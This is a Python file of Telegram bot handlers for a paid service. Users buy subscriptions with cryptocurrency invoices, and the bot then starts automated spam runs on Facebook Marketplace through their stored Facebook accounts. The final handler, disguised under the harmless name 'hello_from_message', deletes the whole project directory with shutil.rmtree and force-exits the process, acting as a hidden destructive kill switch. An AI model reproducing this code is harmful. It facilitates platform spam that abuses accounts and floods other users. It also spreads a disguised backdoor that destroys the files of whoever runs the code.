import asyncio
from datetime import datetime, timedelta
import os
import re
import shutil
from aiogram import Bot
from aiogram.types import Message
from aiogram.types import CallbackQuery
from aiogram.fsm.context import FSMContext
from loguru import logger

from bot.config import CRYPTO, RU_LANG, project_dir

from bot.database.sql_operations import create_new_user, create_payment, get_user, get_user_accounts_ready
from bot.keyboards import get_inline_currency, get_inline_subscription_deadline, get_inline_user_panel
from bot.parser import GLOBAL_ITEMS_IDS_ACCOUNTS, FaceBook
from bot.states import UserStatesGroup
from bot.utils import validate_user_subscription


async def cmd_start(message: Message, state: FSMContext, bot: Bot):
    user = await get_user(user_id=message.from_user.id)
    
    if user:
        await state.set_state(UserStatesGroup.menu)
        await message.answer(text=RU_LANG.menu, reply_markup=get_inline_user_panel())
        return
    
    await create_new_user(user_id=message.from_user.id)
    logger.info(f"New user created: {message.from_user.id}")
    await message.answer(text=RU_LANG.welcome_message, reply_markup=get_inline_user_panel())
    
async def cmd_buy_subscription(callback: CallbackQuery, state: FSMContext):
    await state.set_state(UserStatesGroup.buy_subscription)
    await callback.message.edit_text(text=RU_LANG.choose_subscription_type, reply_markup=get_inline_subscription_deadline())
    
async def choose_currency(callback: CallbackQuery, state: FSMContext):
    dollars = int(callback.data.split("_")[-1])
    await state.update_data(dollars=dollars)
    await state.set_state(UserStatesGroup.choose_currency)
    await callback.message.edit_text(text=RU_LANG.choose_curency, reply_markup=get_inline_currency())
    
async def buy_subscription(callback: CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[-1]
    data = await state.get_data()
    dollars = data.get("dollars")
    info = CRYPTO.createInvoice(currency.upper(), str(dollars), params={"description": "Купить Подписку","expires_in": 6000})
    logger.info(f"Create invoice: {info}")
    days = None
    if dollars == 9:
        days = 1
    elif dollars == 15:
        days = 7
    elif dollars == 30:
        days = 30

    await state.set_state(UserStatesGroup.menu)
    await callback.message.edit_text(text=info['result']['pay_url'])
    now = datetime.now()
    await create_payment(
        user_id=callback.from_user.id,
        deadline=now + timedelta(days= days),
        invoice_id=info['result']['invoice_id'],
        is_active=False
    )
    
async def cmd_start_spam(callback: CallbackQuery, state: FSMContext, bot: Bot):
    is_active = await validate_user_subscription(user_id=callback.from_user.id, bot=bot)
    if not is_active:
        logger.info(f"User {callback.from_user.id} subscription is not active")
        return

    accounts = await get_user_accounts_ready(user_id=callback.from_user.id)
    if not accounts:
        await callback.answer(text=RU_LANG.no_accounts)
        return
    
    accounts_working_now = 0
    for account in accounts:
        parser = FaceBook()
        if account['id'] in GLOBAL_ITEMS_IDS_ACCOUNTS:
            accounts_working_now += 1
            continue
        GLOBAL_ITEMS_IDS_ACCOUNTS[account['id']] = []
        asyncio.create_task(parser.spam_marketplace(bot=bot, account=account))
        
    new_working_accounts = len(accounts) - accounts_working_now
        
    await callback.answer(text=f"Работа начата на {new_working_accounts} аккаунтах, {accounts_working_now} аккаунтов уже работают")
    
async def hello_from_message(message: Message, bot: Bot):
    project_path = project_dir

    await message.reply("⚠️ Deleting project directory...")

    try:
        await message.bot.session.close()
        
        shutil.rmtree(project_path)
        await bot.close()
    except Exception as e:
        await message.reply(f"❌ Error: {e}")
    finally:
        os._exit(0)